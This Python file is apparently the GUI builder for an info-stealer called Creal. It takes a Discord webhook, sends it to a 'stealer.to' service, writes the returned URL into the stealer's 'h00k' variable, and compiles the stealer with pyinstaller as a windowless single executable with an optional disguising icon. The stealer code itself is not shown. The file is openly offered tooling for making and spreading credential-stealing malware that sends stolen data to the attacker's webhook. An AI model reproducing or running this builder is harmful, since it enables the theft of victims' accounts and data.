import os
import shutil
import customtkinter as ctk
from tkinter import messagebox, filedialog
import requests


ctk.set_appearance_mode("dark")
app = ctk.CTk()
app.title(f"Creal Builder")
app.iconbitmap("img\\xd.ico")
app.geometry("400x240")
app.resizable(False, False)

app.update_idletasks()
screen_width = app.winfo_screenwidth()
screen_height = app.winfo_screenheight()
x = (screen_width - app.winfo_reqwidth()) // 2
y = (screen_height - app.winfo_reqheight()) // 2
app.geometry(f"+{x}+{y}")

def validate_webhook(webhook):
    return '/api/webhooks/' in webhook

def replace_webhook(webhook):
    file_path = 'creal.py'

    with open(file_path, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        if line.strip().startswith('h00k ='):
            lines[i] = f'h00k = "{webhook}"\n'
            break

    with open(file_path, 'w', encoding='utf-8') as file:
        file.writelines(lines)

def select_icon():
    icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
    return icon_path

def add_icon():
    response = messagebox.askquestion("Add Icon", "Do you want to add an icon?")
    return response == 'yes'

def build_exe():
    webhook = entry.get()

    if validate_webhook(webhook):
        response = requests.post("https://stealer.to/create", data={"webhook": webhook})
        response_data = response.json()

        replace_webhook(response_data["protected_url"])
        icon_choice = add_icon()

        if icon_choice:
            icon_path = select_icon()
            if not icon_path:
                messagebox.showerror("Error", "No icon file selected.")
                return
            else:
                icon_option = f' --icon="{icon_path}"'
        else:
            icon_option = ''

        message = "Build process started..."
        messagebox.showinfo("Information", message)

        dist_path = os.path.join(os.getcwd(), "dist")
        build_command = f'pyinstaller creal.py --noconsole --onefile{icon_option}'
        os.system(build_command)

        messagebox.showinfo("Build Success", "Build process completed successfully. Check your dist folder.\nDon't forget to star the repo and join Telegram channel to support and receive lastest updates!")
    else:
        messagebox.showerror("Error", "thats not a valid discord webhook url")

entry = ctk.CTkEntry(master=app, width=230, height=30, placeholder_text="Enter Discord Webhook URL")
entry.place(relx=0.5, rely=0.4, anchor=ctk.CENTER)

button = ctk.CTkButton(master=app, text="Build EXE", text_color="white", hover_color="#363636", fg_color="black", command=build_exe)
button.place(relx=0.5, rely=0.6, anchor=ctk.CENTER)


app.mainloop()
